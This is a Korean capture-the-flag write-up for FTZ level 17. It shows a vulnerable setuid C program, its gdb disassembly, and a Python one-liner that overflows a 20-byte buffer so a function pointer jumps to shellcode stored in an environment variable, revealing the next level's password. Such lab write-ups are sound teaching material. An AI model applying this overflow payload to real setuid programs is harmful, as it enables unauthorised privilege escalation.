# **FTZ LEVEL17**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```
FTZ 16와 달리 `shell()`가 없으므로 직접 `shellcode` 를 환경변수에 올려서 `call()`를 호출하는 부분을 `shellcode` 의 시작 주소로 바꾸겠다. ( [환경변수 이용하기](https://github.com/papico0306/SystemHackingPractice/blob/master/FTZ_Solve/ftz11_solve.md "환경변수 이용하기") )

환경변수의 주소를 구하고
```
[level17@ftz level17]$ /tmp/ge EGG
EGG=0xbffffc3d
```
gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x080484a8 <main+0>:	push   ebp
0x080484a9 <main+1>:	mov    ebp,esp
0x080484ab <main+3>:	sub    esp,0x38
0x080484ae <main+6>:	mov    DWORD PTR [ebp-16],0x8048490
0x080484b5 <main+13>:	sub    esp,0x4
0x080484b8 <main+16>:	push   ds:0x804967c
0x080484be <main+22>:	push   0x30
0x080484c0 <main+24>:	lea    eax,[ebp-56]
0x080484c3 <main+27>:	push   eax
0x080484c4 <main+28>:	call   0x8048350 <fgets>
0x080484c9 <main+33>:	add    esp,0x10
0x080484cc <main+36>:	sub    esp,0x8
0x080484cf <main+39>:	push   0xc1a
0x080484d4 <main+44>:	push   0xc1a
0x080484d9 <main+49>:	call   0x8048380 <setreuid>
0x080484de <main+54>:	add    esp,0x10
0x080484e1 <main+57>:	mov    eax,DWORD PTR [ebp-16]
0x080484e4 <main+60>:	call   eax
0x080484e6 <main+62>:	leave  
0x080484e7 <main+63>:	ret    
0x080484e8 <main+64>:	nop    
0x080484e9 <main+65>:	nop    
0x080484ea <main+66>:	nop    
0x080484eb <main+67>:	nop    
0x080484ec <main+68>:	nop    
0x080484ed <main+69>:	nop    
0x080484ee <main+70>:	nop    
0x080484ef <main+71>:	nop    
End of assembler dump.
```
`printit()` 의 주소가 `ebp-16` 에 들어가고, `buf` 는 `ebp-56` 에 들어간다. 따라서 환경 변수의 주소를 `ebp-16` 에 넣어 주면 쉽게 풀릴 것 같다.
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[20] | dummy[20] | &(printit()) | dummy[12] | sfp | ret
```

>Payload
```
 (python -c "print 'A'*40+'\x3d\xfc\xff\xbf'";cat) | ./attackme 
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level17@ftz level17]$ (python -c "print 'A'*40+'\x3d\xfc\xff\xbf'";cat) | ./attackme 
my-pass
TERM environment variable not set.

Level18 Password is "~~~~~~~~~".
```